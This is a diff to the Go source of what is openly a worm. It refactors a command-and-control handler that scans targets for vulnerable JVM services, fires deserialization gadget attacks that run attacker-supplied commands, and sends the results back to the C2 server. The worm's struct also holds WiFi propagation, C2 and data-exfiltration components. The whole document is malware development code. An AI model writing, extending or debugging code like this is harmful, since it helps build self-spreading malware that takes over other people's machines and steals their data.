@@ -1075,7 +1075,6 @@ func (c2 *C2Manager) handleJVMLateral(cmd C2Command) {
     fmt.Printf("[C2] JVM_LATERAL target=%s technique=%s\n", target, technique)
     
     scanner := jvm_lateral.NewJVMScanner()
-    attacker := jvm_lateral.NewJVMAttacker()
     
     services := scanner.ScanTargets([]string{target})
     if len(services) == 0 {
@@ -1091,15 +1090,14 @@ func (c2 *C2Manager) handleJVMLateral(cmd C2Command) {
         if !svc.Vulnerable {
             continue
         }
-        for _, g := range svc.Chains {
-            r := attacker.AttackJVMService(svc, g, command)
-            results = append(results, map[string]interface{}{
-                "target":  r.Target,
-                "gadget":  r.Gadget,
-                "success": r.Success,
-                "output":  r.Output,
-            })
-        }
+        r := jvm_lateral.AttackService(svc, technique, command)
+        results = append(results, map[string]interface{}{
+            "target":   r.Target,
+            "gadget":   r.Gadget,
+            "success":  r.Success,
+            "output":   r.Output,
+            "payload":  r.PayloadLen,
+        })
     }
     
     c2.sendToC2("JVM_RESULT", map[string]interface{}{
@@ -1360,7 +1358,7 @@ type Worm struct {
     wifiPropagator   *WiFiPropagator
     c2Manager        *C2Manager
     dataExfiltrator  *DataExfiltrator
-    jvmLateral       *jvm_lateral.JVMLateralModule
+    jvmLateral       *jvm_lateral.Module
     status           string
     mu               sync.Mutex
 }
@@ -1382,7 +1380,7 @@ func NewWorm() *Worm {
     w.wifiPropagator = NewWiFiPropagator()
     w.c2Manager = NewC2Manager()
     w.dataExfiltrator = NewDataExfiltrator()
-    w.jvmLateral = jvm_lateral.NewJVMLateralModule()
+    w.jvmLateral = jvm_lateral.NewModule()
     
     return w
 }
